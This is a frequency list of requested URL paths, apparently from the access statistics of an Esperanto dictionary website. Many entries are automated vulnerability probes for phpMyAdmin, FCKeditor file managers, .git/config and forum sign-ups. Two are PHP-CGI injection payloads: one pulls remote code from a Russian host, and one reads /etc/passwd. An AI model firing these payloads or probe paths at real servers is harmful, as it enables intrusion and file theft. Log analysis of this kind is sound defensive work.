Freq;Page
2;/info/mailto:[email]?subject=ervo
2;/info/text/javascript
2;/info/vortaro.reformal.ru
2;/iwantgetyouremail
2;/jsys.phpindex.php
2;/labels.rdf
2;/mailto:[email]?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20Aleks
2;/mailto:[email]?subject=Letero%20de%20la%20vortara%20pagxaro%20por%20la%20auxtoro
2;/mailto:[email]?subject=ervo
2;/Microsoft.XMLHTTP
2;/mod/pages/tpl/pages_add.html
2;/plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/tinybrowser.php?type=file&folder=
2;/pri/5.01
2;/pri/text/javascript
2;/pri/vortaro.reformal.ru
2;/search
2;/ser%09o/-en-
2;/ser%C4%89o/posedi
2;/ser%C4%EF%BF%BDo/brava
2;/ser%C4%EF%BF%BDo/forumo
2;/ser?o/
2;/ser?o/-en-
2;/ser?o/femuro
2;/ser?o/forumo
2;/ser?o/koncerni
2;/ser?o/kuko
2;/ser?tono
2;/serco/cirkvitkarto
2;/serco/cirkvittabulo
2;/serco/gamo
2;/sercxo/%D0%9A%D0%BE%D1%80%D1%80%D0%B5%D1%81%D0%BF%D0%BE%D0%BD%D0%B4%D0%B5%D0%BD%D1%82%20%28%D0%B6%D1%83%D1%80%D0%BD%D0%B0%D0%BB%29
2;/sercxo/%D1%87%D0%B5%D1%80%D0%BD%D0%B0%D1%8F+%D1%81%D0%BC%D0%BE%D1%80%D0%BE%D0%B4%D0%B8%D0%BD%D0%B0
2;/sercxo/+%D0%B2%D0%B2%D0%B8%D0%B4%D1%83
2;/sercxo/Asus+Lamborghini+Eee+PC+VX6S+ubuntu+install
2;/sercxo/goldendict+command-line+version
2;/sercxo/mu%3Fi
2;/sercxo/pomocna+r%C4%99ka
2;/sercxo/text/javascript
2;/submit.autocomplete
2;/user/register
2;/wp-admin.php
1;/-
1;/%D0%B2%D1%81%D0%B5-%D1%82%D0%B0%D0%BA%D0%B8
1;/%D1%81%D0%BF%D0%BE%D1%80%D0%B8%D1%82%D1%8C
1;/.git/config
1;/.svn/entries
1;///mc.yandex.ru/metrika/watch.js
1;//_myadmin/scripts/setup.php
1;//2010/phpMyAdmin/scripts/setup.php
1;//2011/phpMyAdmin/scripts/setup.php
1;//admin/fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//admin/includes/stylesheet.css
1;//admin/main.php
1;//admin/my/scripts/setup.php
1;//admin/mysqladmin/scripts/setup.php
1;//admin/pmadm/scripts/setup.php
1;//admin/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//ajaxfilemanager/jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//b2b/admin/includes/stylesheet.css
1;//backup/scripts/setup.php
1;//cart/admin/includes/stylesheet.css
1;//cbadmin/scripts/setup.php
1;//cbadmin2/scripts/setup.php
1;//db1/scripts/setup.php
1;//dbadmin/
1;//dbadmin/main.php
1;//dbAdmin/scripts/setup.php
1;//dbg/scripts/setup.php
1;//eshop/admin/includes/stylesheet.css
1;//faq/admin/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//FCKeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//forum/includes/xml/bitfield_vbseo.xml
1;//gallery/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//includes/fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//includes/tinymce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//includes/xml/bitfield_vbseo.xml
1;//javascript/tinymce/jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//js/jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//js/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//jscripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//libs/scripts/setup.php
1;//main/inc/lib/fckeditor/editor//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//my-php/scripts/setup.php
1;//My-php/scripts/setup.php
1;//my/scripts/setup.php
1;//myad/scripts/setup.php
1;//myadmin/
1;//myadmin/main.php
1;//myadmin/MyAdmin/scripts/setup.php
1;//mydb/scripts/setup.php
1;//mysql-admin/
1;//mysql/
1;//mysql//scripts/setup.php
1;//mysql/main.php
1;//mysql2/scripts/setup.php
1;//mysqlmanager/
1;//p/m/a/
1;//p/m/a/index.php
1;//pa/scripts/setup.php
1;//phadmin/scripts/setup.php
1;//photo/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//php-my-admin/
1;//php-myadmin/
1;//php/main.php
1;//php1/scripts/setup.php
1;//phpad/scripts/setup.php
1;//phpma/scripts/setup.php
1;//phpMA/scripts/setup.php
1;//phpmanager/
1;//phpmy-admin/
1;//phpmy/my/scripts/setup.php
1;//phpMyAdmin-1/scripts/setup.php
1;//phpMyAdmin-2.10.0.2-english/scripts/setup.php
1;//phpMyAdmin-2.10.0.2/scripts/setup.php
1;//phpMyAdmin-2.10.3/scripts/setup.php
1;//phpMyAdmin-2.11.1.2-all-languages/scripts/setup.php
1;//phpMyAdmin-2.11.10.1/scripts/setup.php
1;//phpMyAdmin-2.11.11.1-english/scripts/setup.php
1;//phpMyAdmin-2.11.11.3/scripts/setup.php
1;//phpMyAdmin-2.11.2.2/scripts/setup.php
1;//phpMyAdmin-2.11.4-all-languages-utf-8-only/scripts/setup.php
1;//phpMyAdmin-2.11.5-english/scripts/setup.php
1;//phpMyAdmin-2.11.5.1-all-languages/scripts/setup.php
1;//phpMyAdmin-2.11.6-all-languages/scripts/setup.php
1;//phpMyAdmin-2.11.9.3/scripts/setup.php
1;//phpMyAdmin-2.11.9.5/scripts/setup.php
1;//phpMyAdmin-2.11.9.6/scripts/setup.php
1;//phpMyAdmin-2.2.3/
1;//phpMyAdmin-2.2.6/
1;//phpMyAdmin-2.5.1/
1;//phpMyAdmin-2.5.4/
1;//phpMyAdmin-2.5.5-rc1/
1;//phpMyAdmin-2.5.5-rc2/
1;//phpMyAdmin-2.5.5/
1;//phpMyAdmin-2.5.6-rc2/
1;//phpMyAdmin-2.5.7-pl1/
1;//phpMyAdmin-2.5.7/
1;//phpMyAdmin-2.6.0-alpha/
1;//phpMyAdmin-2.6.0-alpha2/
1;//phpMyAdmin-2.6.0-beta1/
1;//phpMyAdmin-2.6.0-beta2/
1;//phpMyAdmin-2.6.0-pl1/
1;//phpMyAdmin-2.6.0-pl2/
1;//phpMyAdmin-2.6.0-pl3/
1;//phpMyAdmin-2.6.0-rc1/
1;//phpMyAdmin-2.6.0-rc2/
1;//phpMyAdmin-2.6.0-rc3/
1;//phpMyAdmin-2.6.0/
1;//phpMyAdmin-2.6.1-pl2/
1;//phpMyAdmin-2.6.1-rc1/
1;//phpMyAdmin-2.6.1-rc2/
1;//phpMyAdmin-2.6.1/
1;//phpMyAdmin-2.6.2-beta1/
1;//phpMyAdmin-2.6.2-pl1/
1;//phpMyAdmin-2.6.2/
1;//phpMyAdmin-2.6.3-pl1/
1;//phpMyAdmin-2.6.3-rc1/
1;//phpMyAdmin-2.6.4-pl1/
1;//phpMyAdmin-2.6.4-pl2/
1;//phpMyAdmin-2.6.4-pl3/
1;//phpMyAdmin-2.6.4-pl4/
1;//phpMyAdmin-2.6.4-rc1/
1;//phpMyAdmin-2.6.4/
1;//phpMyAdmin-2.7.0-beta1/
1;//phpMyAdmin-2.7.0-pl1/
1;//phpMyAdmin-2.7.0-pl2/
1;//phpMyAdmin-2.7.0-rc1/
1;//phpMyAdmin-2.8.0-beta1/
1;//phpMyAdmin-2.8.0.2/
1;//phpMyAdmin-2.8.0.3/
1;//phpMyAdmin-2.8.0.4/
1;//phpMyAdmin-2.8.0/
1;//phpMyAdmin-2.8.1-rc1/
1;//phpMyAdmin-2.8.1/
1;//phpMyAdmin-2.8.2.2/scripts/setup.php
1;//phpMyAdmin-2.8.2/
1;//phpMyAdmin-2.9.0.3/scripts/setup.php
1;//phpMyAdmin-2/
1;//phpMyAdmin-3.0.0-all-languages/scripts/setup.php
1;//phpMyAdmin-3.0.0-rc2/scripts/setup.php
1;//phpMyAdmin-3.0.0/scripts/setup.php
1;//phpMyAdmin-3.0.1.1-all-languages/scripts/setup.php
1;//phpMyAdmin-3.4.9-all-languages/scripts/setup.php
1;//phpMyAdmin-3.4.9-english/scripts/setup.php
1;//phpMyAdmin-3.4.9/scripts/setup.php
1;//phpMyAdmin-3.5.0-beta1-all-languages/scripts/setup.php
1;//phpMyAdmin-3.5.0-beta1-english/scripts/setup.php
1;//phpMyAdmin-3.5.0/scripts/setup.php
1;//phpMyAdmin-english/scripts/setup.php
1;//phpmyadmin.old/main.php
1;//phpmyadmin2/
1;//phpMyAdmin2/
1;//phpmyadmin2/main.php
1;//phpMyAdmin2011/scripts/setup.php
1;//phpMyAdmin211/scripts/setup.php
1;//phpmyadmin29/scripts/setup.php
1;//phpmysql/scripts/setup.php
1;//phpmysql/sql/scripts/setup.php
1;//pma//scripts/setup.php
1;//pma/main.php
1;//pma1/scripts/setup.php
1;//pma2005/
1;//PMA2005/
1;//pmabd/scripts/setup.php
1;//pmy/scripts/setup.php
1;//PMYADM/phpMyAdmin-2.10.0.2-english/scripts/setup.php
1;//scripts/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//sgl/scripts/setup.php
1;//shop/admin/includes/javascript/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//shop/admin/includes/stylesheet.css
1;//sqladmin//scripts/setup.php
1;//sqlmanager/
1;//sqlweb/
1;//store/admin/includes/stylesheet.css
1;//tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//vb/includes/xml/bitfield_vbseo.xml
1;//vbulletin/includes/xml/bitfield_vbseo.xml
1;//webadmin/
1;//zc/admin/includes/stylesheet.css
1;//zen/admin/includes/stylesheet.css
1;//zen/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;//zencart/admin/includes/stylesheet.css
1;//zenphoto/zp-core/zp-extensions/tiny_mce//plugins/ajaxfilemanager/jscripts/edit_area/edit_area.css
1;/;
1;/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dhttp://nettrans.ru/1.txt
1;/?-nd+auto_prepend_file%3D/etc/passwd
1;/?author=2
1;/?author=3
1;/?feed=rss2
1;/?q=adminindex.php
1;/?q=imce
1;/?t=1354628043213
1;/]
1;/_admin/
1;/_admin/fck/editor/filemanager/upload/test.html
1;/_admin/fckeditor/editor/filemanager/upload/test.html
1;/_admin/FCKeditor/editor/filemanager/upload/test.html
1;/_vti_bin/owssvr.dll?UL=1&ACT=4&BUILD=4518&STRMVER=4&CAPREQ=0
1;/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%EF%EE%E4%F5%EE%E4%FF%F9%E8%E9+%EA%EE%ED%F2%E5%ED%F2+%ED%E5+%EE%E1%ED%E0%F0%F3%E6%E5%ED
1;/</strong>)
1;/2011/08/20/popularste-bremszylinder-auktionen-2/
1;/about.htm
1;/about.html
1;/addons/fckeditor2rc2/editor/filemanager/browser/default/connectors/php/connector.php
1;/adm/fck/editor/filemanager/upload/test.html
1;/adm/fckeditor/editor/filemanager/upload/test.html
1;/adm/FCKeditor/editor/filemanager/upload/test.html
1;/adm/style/tooltip.js
1;/admin/backup.php/login.php?action=backup
1;/admin/fck/editor/filemanager/upload/test.html
1;/admin/fck/fckconfig.js
1;/admin/FCK/fckconfig.js
1;/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/admin/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/admin/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/admin/FCKeditor/editor/filemanager/upload/php/upload.php
1;/admin/fckeditor/editor/filemanager/upload/test.html
1;/admin/FCKeditor/editor/filemanager/upload/test.html
1;/admin/fckeditor/fckconfig.js
1;/admin/FCKeditor/fckconfig.js
1;/admin/include/FCKeditor/editor/filemanager/browser/mcpuk/connectors/php/config.php
1;/admin/include/fckeditor/fckconfig.js
1;/admin/include/FCKeditor/fckconfig.js
1;/admin/login
1;/admin/spaw/spacer.gif
1;/admincp
1;/administrator/components/com_jce/jce.xml
1;/administrator/logout.php
1;/animation
1;/animation/action
1;/animation/adventure
1;/animation/animaciya
1;/animation/anime
1;/animation/biografiya
1;/animation/boevye-iskusstva
1;/animation/comedy
1;/animation/detective
1;/animation/detskiy
1;/animation/documental
1;/animation/drama
1;/animation/fantasy
1;/animation/history
1;/animation/horror
1;/animation/korotkometrazhnyij
1;/animation/kriminal
1;/animation/last
1;/animation/melodrama
1;/animation/muzyka
1;/animation/mystic
1;/animation/myuzikl
1;/animation/new
1;/animation/parodiya
1;/animation/popular
1;/animation/russkie-multfilmy
1;/animation/russkie-multserialy
1;/animation/scifiction
1;/animation/semejnyij
1;/animation/sex
1;/animation/skazka
1;/animation/sovetskie-multfilmy
1;/animation/sport
1;/animation/triller
1;/animation/voenniy
1;/animation/western
1;/animation/zarubezhnye-multfilmy
1;/animation/zarubezhnye-multserialy
1;/apanel/login.php
1;/apple-touch-icon-144x144-precomposed.png
1;/apple-touch-icon-144x144.png
1;/article-sarkozy-seul-a-kaboul-56143404.html
1;/assets/cache/siteCache.idx.php
1;/assets/index.html
1;/atilektcms/
1;/atilektcms/login.aspx?ReturnUrl=/atilektcms/default.aspx
1;/blog/wp-admin/
1;/blog/wp-includes/js/prototype.js
1;/blog/wp-trackback.php
1;/board/
1;/board/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/board/profile.php?mode=register&agreed=true
1;/board/register.php?do=register
1;/board/ucp.php?mode=register&agreed=true
1;/boatilekt/login.aspx
1;/camps
1;/camps/140
1;/camps/workers/410
1;/campsoverview
1;/catalog.php?class=1&type=1
1;/cgi-bin/CMS/getcontent.cgi?template=LoginPage&alias=nicht
1;/cgi-bin/djem/djemserver
1;/cgi-bin/djem/djemserver.cgi
1;/cgi-bin/djemserver
1;/clientscript/vbulletin_global.js
1;/cms/admin/index.php
1;/CMS/getcontent.cgi?template=LoginPage&alias=nicht
1;/cms/kernel/admin.php
1;/community/
1;/company
1;/company.htm
1;/company.html
1;/company.php
1;/contact.htm
1;/contact.html
1;/contact.php
1;/contacts.htm
1;/contacts.html
1;/contacts.php
1;/content_cache/urls
1;/core/js/common.js
1;/core/packages/.gitignore
1;/data/evnanfgpxkptzn?cli=10&ver=spkyf-1.4.9&dat=ns&ref=&url=http%3A%2F%2FEORU.RU
1;/domain/admin/
1;/e107_admin/admin.php
1;/editors/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php
1;/elsxuti/
1;/en/
1;/engine/classes/js/dle_js.js
1;/engine/download.php?id=1114
1;/engine/js/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php
1;/engine/print.php?newsid=0
1;/engine/rss.php
1;/eoru.ru/gram/my_journal/tag/Mysli
1;/eoturu/grda/ieldefo.
1;/erotik-videolar.ru
1;/Falt4/modules/newsletter/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php
1;/fck/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCK/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fck/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCK/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fck/editor/filemanager/upload/php/upload.php
1;/fck/editor/filemanager/upload/test.html
1;/fck/fckconfig.js
1;/FCK/fckconfig.js
1;/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fckeditor/editor/filemanager/browser/mcpuk/connectors/php/connector.php
1;/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F
1;/fckeditor/editor/filemanager/upload/test.html
1;/FCKeditor/editor/filemanager/upload/test.html
1;/fckeditor/fckconfig.js
1;/FCKeditor/fckconfig.js
1;/FCKEDITOR/fckconfig.js
1;/feedback
1;/feedback.htm
1;/feedback.html
1;/feedback.php
1;/film/100500.html
1;/film/action
1;/film/chuzhoj-rajon.html
1;/film/comedy
1;/film/detective
1;/film/detskiy
1;/film/devushka-iz-gologo-glaza.html
1;/film/documental
1;/film/drama
1;/film/elvin-i-burunduki3.html
1;/film/grobovschik.html
1;/film/horror
1;/film/ivan-tsarevich-i-seryij-volk.html
1;/film/kak-ya-ezdil-v-moskvu.html
1;/film/kriminal
1;/film/krovinushka.html
1;/film/lednikovyij-period-rozhdestvo-mamonta.html
1;/film/lyubov-na-dva-polyusa.html
1;/film/melodrama
1;/film/papashi-2.html
1;/film/podborka-video-prikolov-1-nedelya.html
1;/film/podborka-video-prikolov-2-nedelya.html
1;/film/reka.html
1;/film/russkie-multfilmy
1;/film/russkij-film
1;/film/russkij-serial
1;/film/semejnyij
1;/film/shou-meddisona.html
1;/film/triller
1;/film/turnir-dolinyi-fej.html
1;/film/ukraina-chudes.html
1;/film/valera-tv.html
1;/film/vosproizvedenie.html
1;/film/zarubezhnye-multfilmy
1;/film/zarubezhnye-multserialy
1;/film/zarubezhnyj-serial
1;/film/zhit-budete.html
1;/forum
1;/forum/admincp
1;/forum/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forum/jscripts/ipb_topic.js
1;/forum/profile.php?mode=register&agreed=true
1;/forum/register.php?do=register
1;/forum/ucp.php?mode=register&agreed=true
1;/forum1/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forum1/profile.php?mode=register&agreed=true
1;/forum1/register.php?do=register
1;/forum1/ucp.php?mode=register&agreed=true
1;/forum2/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forum2/profile.php?mode=register&agreed=true
1;/forum2/register.php?do=register
1;/forum2/ucp.php?mode=register&agreed=true
1;/forums/
1;/forums/index.php?app=core&module=global&section=register&coppa_user=&termsread=1&coppa_pass=1
1;/forums/profile.php?mode=register&agreed=true
1;/forums/register.php?do=register
1;/forums/ucp.php?mode=register&agreed=true
1;/fun
1;/fun/comedy
1;/fun/detskiy
1;/fun/korotkometrazhnyij
1;/fun/last
1;/fun/new
1;/fun/parodiya
1;/fun/popular
1;/Googlebot/2.1;%20<h2><a%20href="http:/mediakirov.ru">%f1%ee%e7%e4%e0%ed%e8%e5%20%f1%e0%e9%f2%ee%e2%20%e2%20%ca%e8%f0%ee%e2%e5</a></h2>%20http:/mediakirov.ru/www.mediakirov.ru
1;/gram/%5Bobject%20Object%5D://www.bflix.info/worker/init.js?b=2&l=0
1;/gram/10index.php
1;/gram/12/++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;+Result:+%F1%EA%F0%E8%EF%F2%EE%E7%E0%F9%E8%F2%E0+%E4%E5%F8%E8%F4%F0%EE%E2%E0%ED%E0;+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
1;/gram/12+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Result:+%ED%E5+%ED%E0%F8%EB%EE%F1%FC+%F4%EE%F0%EC%FB+%E4%EB%FF+%EE%F2%EF%F0%E0%E2%EA%E8;
